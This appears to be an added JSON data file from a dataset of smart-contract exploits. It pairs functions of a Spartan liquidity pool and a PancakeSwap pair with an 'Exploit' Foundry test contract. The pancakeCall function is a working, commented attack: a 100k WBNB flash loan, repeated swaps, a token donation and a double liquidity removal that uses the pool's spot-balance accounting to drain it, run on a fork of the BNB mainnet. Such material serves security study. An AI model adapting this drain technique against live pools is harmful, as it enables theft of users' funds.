@@ -1,0 +1,184 @@
+[
+  {
+    "contract/interface": "ISpartanPool",
+    "source_type": "victim_contract",
+    "function_name": "addLiquidity",
+    "original_code": "    function addLiquidity() public returns(uint liquidityUnits){\n        liquidityUnits = addLiquidityForMember(msg.sender);\n        return liquidityUnits;\n    }\n\n    // Add liquidity for a member\n    function addLiquidityForMember(address member) public returns(uint liquidityUnits){\n        uint256 _actualInputBase = _getAddedBaseAmount();\n        uint256 _actualInputToken = _getAddedTokenAmount();\n        liquidityUnits = _DAO().UTILS().calcLiquidityUnits(_actualInputBase, baseAmount, _actualInputToken, tokenAmount, totalSupply);\n        _incrementPoolBalances(_actualInputBase, _actualInputToken);\n        _mint(member, liquidityUnits);\n        emit AddLiquidity(member, _actualInputBase, _actualInputToken, liquidityUnits);\n        return liquidityUnits;\n    }\n\n    // Remove Liquidity\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISpartanPool",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISpartanPool",
+    "source_type": "victim_contract",
+    "function_name": "removeLiquidity",
+    "original_code": "    function removeLiquidity() public returns (uint outputBase, uint outputToken) {\n        return removeLiquidityForMember(msg.sender);\n    } \n\n    // Remove Liquidity for a member\n    function removeLiquidityForMember(address member) public returns (uint outputBase, uint outputToken) {\n        uint units = balanceOf(address(this));\n        outputBase = _DAO().UTILS().calcLiquidityShare(units, BASE, address(this), member);\n        outputToken = _DAO().UTILS().calcLiquidityShare(units, TOKEN, address(this), member);\n        _decrementPoolBalances(outputBase, outputToken);\n        _burn(address(this), units);\n        iBEP20(BASE).transfer(member, outputBase);\n        iBEP20(TOKEN).transfer(member, outputToken);\n        emit RemoveLiquidity(member, outputBase, outputToken, units);\n        return (outputBase, outputToken);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISpartanPool",
+    "source_type": "victim_contract",
+    "function_name": "swapTo",
+    "original_code": "    function swapTo(address token, address member) public payable returns (uint outputAmount, uint fee) {\n        require((token == BASE || token == TOKEN), \"Must be BASE or TOKEN\");\n        address _fromToken; uint _amount;\n        if(token == BASE){\n            _fromToken = TOKEN;\n            _amount = _getAddedTokenAmount();\n            (outputAmount, fee) = _swapTokenToBase(_amount);\n        } else {\n            _fromToken = BASE;\n            _amount = _getAddedBaseAmount();\n            (outputAmount, fee) = _swapBaseToToken(_amount);\n        }\n        emit Swapped(_fromToken, token, _amount, outputAmount, fee, member);\n        iBEP20(token).transfer(member, outputAmount);\n        return (outputAmount, fee);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISpartanPool",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUniswapV2Pair",
+    "source_type": "victim_contract",
+    "function_name": "skim",
+    "original_code": "    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    }\n\n    // force reserves to match balances\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUniswapV2Pair",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IUniswapV2Pair",
+    "source_type": "victim_contract",
+    "function_name": "sync",
+    "original_code": "    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "pancakeCall",
+    "original_code": "    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {\n        // 1: swap WBNB for SPARTA 5 times\n        for (uint256 i; i < 4; ++i) {\n            WBNB.transfer(address(SPT1_WBNB), 1913.17 ether);\n            SPT1_WBNB.swapTo(address(SPARTA), address(this));\n        }\n\n        // 2: addLiquidity SPARTA<>WBNB, get LP tokens\n        SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this))); // 2536613.206101067206978364\n        WBNB.transfer(address(SPT1_WBNB), 11_853.33 ether);\n        SPT1_WBNB.addLiquidity();\n\n        // 3: swap WBNB for SPARTA 10 times (more in this step for less slippage)\n        for (uint256 i; i < 9; ++i) {\n            WBNB.transfer(address(SPT1_WBNB), 1674.02 ether);\n            SPT1_WBNB.swapTo(address(SPARTA), address(this));\n        }\n\n        // 4: donate WBNB + SPARTAN to the pool\n        SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this))); // 2639121.977427448690750716\n        WBNB.transfer(address(SPT1_WBNB), 21_632.14 ether);\n\n        // 5: removeLiquidity from step 2. Since the pool uses spot balanceOf() to calculate withdraw amounts, we can withdraw more assets than normal\n        SPT1_WBNB.transfer(address(SPT1_WBNB), SPT1_WBNB.balanceOf(address(this))); // transfer LP tokens into the pool\n        SPT1_WBNB.removeLiquidity(); // important: removeLiquidity() doesn't sync all spot balances into reserves\n\n        // 6: immediately addLiquidity to \"recover\" donated tokens in step 4\n        SPT1_WBNB.addLiquidity();\n\n        // 7: removeLiquidity again to get all assets (with exploited profits) out\n        IERC20(address(SPT1_WBNB)).transfer(address(SPT1_WBNB), IERC20(address(SPT1_WBNB)).balanceOf(address(this)));\n        SPT1_WBNB.removeLiquidity();\n\n        // 8: swap SPARTA back to WBNB\n        uint256 swapAmount = SPARTA.balanceOf(address(this)) / 10;\n        for (uint256 i; i < 9; ++i) {\n            SPARTA.transfer(address(SPT1_WBNB), swapAmount);\n            SPT1_WBNB.swapTo(address(WBNB), address(this));\n        }\n\n        // Repeat step 1 -> 8 to fully drain the pool. ~8 times in total\n\n        // repay\n        WBNB.transfer(address(CAKE_WBNB), amount1 * 1000 / 997);\n\n        console.log(\"%s WBNB profit\", WBNB.balanceOf(address(this)) / 1e18);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://binance.llamarpc.com\", 7_048_832);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploit",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        CAKE_WBNB.swap(0, 100_000 ether, address(this), \"flashloan 100k WBNB\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWBNB",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWBNB",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "",
+    "description": ""
+  }
+]
